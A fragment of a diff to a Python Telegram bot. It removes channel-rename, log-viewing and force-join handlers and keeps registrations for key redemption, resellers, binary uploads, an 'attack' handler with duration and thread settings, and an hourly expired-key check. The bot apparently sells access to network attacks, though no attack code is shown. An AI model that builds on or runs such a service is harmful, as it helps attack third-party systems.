-            GET_CHANNEL_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, change_channel_name_input)],
-        },
-    fallbacks=[CommandHandler("cancel", cancel_conversation)],
     )
 
     set_threads_handler = ConversationHandler(
@@ -3501,7 +3323,6 @@ def main():
     application.add_handler(redeem_key_handler)
     application.add_handler(attack_handler)
     application.add_handler(set_duration_handler)
-    application.add_handler(change_channel_handler)
     application.add_handler(set_threads_handler)
     application.add_handler(delete_key_handler)
     application.add_handler(add_reseller_handler)
@@ -3515,7 +3336,6 @@ def main():
     application.add_handler(upload_binary_handler)
     application.add_handler(add_co_owner_handler)
     application.add_handler(CommandHandler("users", show_users))
-    application.add_handler(MessageHandler(filters.Text("📜 View Logs"), view_logs))
     application.add_handler(remove_co_owner_handler)
     application.add_handler(display_name_handler)
     application.add_handler(reseller_status_handler)
@@ -3532,10 +3352,6 @@ def main():
     application.add_handler(delete_binary_handler)
     application.add_handler(CommandHandler("listbots", show_bot_list_cmd))
     application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("forceon", force_join_on))
-    application.add_handler(CommandHandler("forceoff", force_join_off))
-    application.add_handler(MessageHandler(filters.Text("Force On"), force_join_on))
-    application.add_handler(MessageHandler(filters.Text("Force Off"), force_join_off))
     application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_button_click))
     application.add_handler(MessageHandler(filters.ALL & filters.ChatType.PRIVATE, track_new_chat))
@@ -3546,8 +3362,8 @@ def main():
     # Add job queue to check expired keys
     job_queue = application.job_queue
     job_queue.run_repeating(check_expired_keys, interval=3600, first=10)  # Check every hour
+
     application.run_polling()
 
 if __name__ == '__main__':
     main()
-
